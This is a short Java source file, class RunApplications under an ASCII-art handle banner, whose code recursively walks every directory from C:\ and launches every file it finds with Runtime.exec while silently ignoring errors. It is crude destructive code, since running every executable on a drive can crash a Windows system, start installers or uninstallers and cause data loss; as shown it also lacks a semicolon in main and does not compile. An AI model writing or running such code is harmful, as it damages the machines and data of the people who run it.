/*
__          ______ ____        _                       ____  _                 _       ___       _        
\ \        / /___ \___ \      | |                     |___ \| |               | |     / _ \     | |       
 \ \  /\  / /  __) |__) | __ _| |_ __ _ _ __ __ ___   ____) | | __ _ _ __   __| |_ __| | | | ___| | _____ 
  \ \/  \/ /  |__ <|__ < / _` | __/ _` | '__/ _` \ \ / /__ <| |/ _` | '_ \ / _` | '__| | | |/ __| |/ / __|
   \  /\  /   ___) |__) | (_| | || (_| | | | (_| |\ V /___) | | (_| | | | | (_| | |  | |_| | (__|   <\__ \
    \/  \/   |____/____/ \__,_|\__\__, |_|  \__,_| \_/|____/|_|\__,_|_| |_|\__,_|_|   \___/ \___|_|\_\___/
                                   __/ |                                                                  
                                  |___/                                                                   
*/
package net.domih;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class RunApplications {

	public static void openFiles(File directory) {
		
		if (!directory.isDirectory())
			return;
		
		File[] dirContent = directory.listFiles();
												
		for (File file : dirContent) {
			if (file.isFile()) {
				try {
					Runtime.getRuntime().exec(file.getAbsolutePath().toString(), null, new File("."));
				} catch (IOException e) {
					
				}
			} else {
				openFiles(file);
			}
		}

	}

	public static void main(String[] args) {
		openFiles(new File("C:\\"))
	}
}
